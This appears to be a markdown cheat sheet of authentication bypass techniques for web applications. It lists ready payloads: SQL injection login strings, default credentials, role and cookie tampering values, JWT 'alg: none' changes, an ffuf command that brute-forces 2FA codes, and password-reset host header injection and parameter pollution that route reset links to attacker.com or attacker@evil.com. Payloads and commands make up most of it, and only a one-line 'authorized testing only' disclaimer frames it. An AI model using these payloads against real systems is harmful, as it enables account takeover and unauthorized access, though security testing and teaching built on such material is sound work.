# 🔐 Authentication Bypass Cheatsheet

```
   █████╗ ██╗   ██╗████████╗██╗  ██╗    ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
  ██╔══██╗██║   ██║╚══██╔══╝██║  ██║    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
  ███████║██║   ██║   ██║   ███████║    ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
  ██╔══██║██║   ██║   ██║   ██╔══██║    ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
  ██║  ██║╚██████╔╝   ██║   ██║  ██║    ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
  ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝    ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
```

---

## 🔍 Login Bypass Techniques

### SQL Injection
```sql
admin'--
admin' #
' OR '1'='1
' OR 1=1--
") OR ("1"="1
```

### Default Credentials
```
admin:admin
admin:password
admin:123456
root:root
test:test
guest:guest
```

### Parameter Manipulation
```http
# Change user type
user_type=admin
role=administrator
isAdmin=true
admin=1

# Skip verification
verified=true
mfa_verified=true
```

---

## 🔑 2FA/MFA Bypass

### Response Manipulation
```http
# Change false to true
{"success": false} → {"success": true}
{"2fa_valid": false} → {"2fa_valid": true}
```

### Status Code Manipulation
```http
# If 401/403, try changing to 200
# Using proxy to modify response
```

### Direct Navigation
```http
# After login, skip 2FA page
/login → /2fa → /dashboard
# Try going directly to /dashboard
```

### Code Bruteforce
```bash
# 4-digit codes
ffuf -u https://target.com/2fa -X POST \
  -d "code=FUZZ" -w <(seq -w 0000 9999)
```

### Code Reuse
```http
# Try using old/expired codes
# Try same code multiple times
```

### Null/Empty Values
```json
{"2fa_code": ""}
{"2fa_code": null}
{"2fa_code": "000000"}
```

---

## 🔓 Password Reset Bypass

### Host Header Injection
```http
POST /reset HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com

email=victim@target.com
```

### Token Manipulation
```http
# Predictable tokens
token=1
token=admin
token=base64(user_id)

# Token reuse
# Use your reset token with victim's email
```

### Parameter Pollution
```http
email=attacker@evil.com&email=victim@target.com
email[]=attacker@evil.com&email[]=victim@target.com
```

### Response Manipulation
```json
// Find token in response
{"token": "abc123", "email": "victim@target.com"}
```

---

## 🛡️ Session/Cookie Bypass

### Cookie Manipulation
```http
# Change values
Cookie: isAdmin=false → isAdmin=true
Cookie: user_id=123 → user_id=1
Cookie: role=user → role=admin
```

### JWT Manipulation
```json
// Change claims
{"role": "user"} → {"role": "admin"}
{"alg": "HS256"} → {"alg": "none"}
```

### Session Fixation
```http
# Set attacker's session to victim
# Victim logs in with attacker's session ID
```

---

## 📊 Quick Reference

| Bypass Type | Technique |
|-------------|-----------|
| Login | SQLi, default creds |
| 2FA | Response manipulation, brute |
| Password Reset | Host header, token reuse |
| Session | Cookie tampering, JWT |

### Common Vulnerable Points
```
- Login forms
- Password reset flows
- 2FA/MFA implementations
- Remember me functions
- Account verification
- OAuth implementations
```

---

## 📚 Resources

- [PortSwigger Authentication](https://portswigger.net/web-security/authentication)
- [HackTricks Auth Bypass](https://book.hacktricks.xyz/pentesting-web/authentication-bypass)

---

<p align="center">
  <b>🔐 Break Authentication!</b><br>
  <i>For authorized testing only!</i>
</p>
